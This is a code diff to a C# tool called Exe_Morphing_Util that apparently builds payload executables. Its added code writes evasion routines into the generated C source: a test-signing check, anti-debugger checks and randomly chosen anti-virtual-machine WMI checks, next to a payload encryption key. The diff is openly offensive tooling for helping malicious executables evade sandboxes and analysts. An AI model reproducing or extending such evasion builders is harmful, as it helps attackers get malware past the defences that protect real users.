@@ -21,9 +21,9 @@ namespace Exe_Morphing_Util
         public int payloadcryptkey;
         bool devmode = true;
 
-        private static string RandomStringJustChars(int size) // need just 
+        private static string RandomStringJustChars(int size) // C demands things start with chars not numbers for function names
         {
-            Sleep(300);
+            Sleep(300); // more random
             string _chars = "abcdefghijklmnopqrstuvwxyz";
             Random _rng = new Random((int)GetTickCount());
             char[] buffer = new char[size];
@@ -167,6 +167,7 @@ namespace Exe_Morphing_Util
         private void btnMorph_Click(object sender, EventArgs e)
         {
             // for table of geo locations, use https://docs.microsoft.com/en-us/windows/desktop/Intl/table-of-geographical-locations
+            // at some point, query for test signing with WMI via https://docs.microsoft.com/en-us/previous-versions/windows/desktop/bcd/bcdstore
             // US is 244
             if (tbfilehere.Text == "")
             {
@@ -680,7 +681,12 @@ namespace Exe_Morphing_Util
                 // make adjustments to file based on checkboxes
 
                 // now we do our evasions
-                fs.Seek(1912, SeekOrigin.Begin);  // be mindful of where this is. 
+                fs.Seek(1956, SeekOrigin.Begin);  // be mindful of where this is. 
+
+                if(cbTestSigning.Checked)
+                {
+                    sw.WriteLine("TestSigningCheck();");
+                }
 
                 if (cbAntiDebug.Checked)
                 {
@@ -711,6 +717,32 @@ namespace Exe_Morphing_Util
                     sw.WriteLine("}");
                     sw.WriteLine("reg_enum_vm_check();");
                     sw.WriteLine("anti_vm_wmi();");
+                    Random ran = new Random();
+                    int rando = ran.Next(1, 7);
+                    switch (rando)
+                    {
+                        case 1:
+                            sw.WriteLine("anti_vm_wmi_1();");
+                            break;
+                        case 2:
+                            sw.WriteLine("anti_vm_wmi_2();");
+                            break;
+                        case 3:
+                            sw.WriteLine("anti_vm_wmi_3();");
+                            break;
+                        case 4:
+                            sw.WriteLine("anti_vm_wmi_4();");
+                            break;
+                        case 5:
+                            sw.WriteLine("anti_vm_wmi_5();");
+                            break;
+                        case 6:
+                            sw.WriteLine("anti_vm_wmi_6();");
+                            break;
+                        case 7:
+                            sw.WriteLine("anti_vm_wmi_7();");
+                            break;
+                    }
                 }
                 if (cbSpecial.Checked)
                 {
@@ -855,7 +887,12 @@ namespace Exe_Morphing_Util
             // make adjustments to file based on checkboxes
 
             // now we do our evasions
-            fs.Seek(1981, SeekOrigin.Begin);
+            fs.Seek(2022, SeekOrigin.Begin);
+
+            if (cbTestSigning.Checked)
+            {
+                sw.WriteLine("TestSigningCheck();");
+            }
 
             if (cbAntiDebug.Checked)
             {
@@ -885,7 +922,33 @@ namespace Exe_Morphing_Util
                 sw.WriteLine("PassToNoobs();");
                 sw.WriteLine("}");
                 sw.WriteLine("reg_enum_vm_check();");
-                sw.WriteLine("anti_vm_wmi();");
+                Random ran = new Random();
+                int rando = ran.Next(1, 7);
+                switch (rando)
+                {
+                    case 1:
+                        sw.WriteLine("anti_vm_wmi_1();");
+                        break;
+                    case 2:
+                        sw.WriteLine("anti_vm_wmi_2();");
+                        break;
+                    case 3:
+                        sw.WriteLine("anti_vm_wmi_3();");
+                        break;
+                    case 4:
+                        sw.WriteLine("anti_vm_wmi_4();");
+                        break;
+                    case 5:
+                        sw.WriteLine("anti_vm_wmi_5();");
+                        break;
+                    case 6:
+                        sw.WriteLine("anti_vm_wmi_6();");
+                        break;
+                    case 7:
+                        sw.WriteLine("anti_vm_wmi_7();");
+                        break;
+                }
+
             }
             if (cbSpecial.Checked)
             {
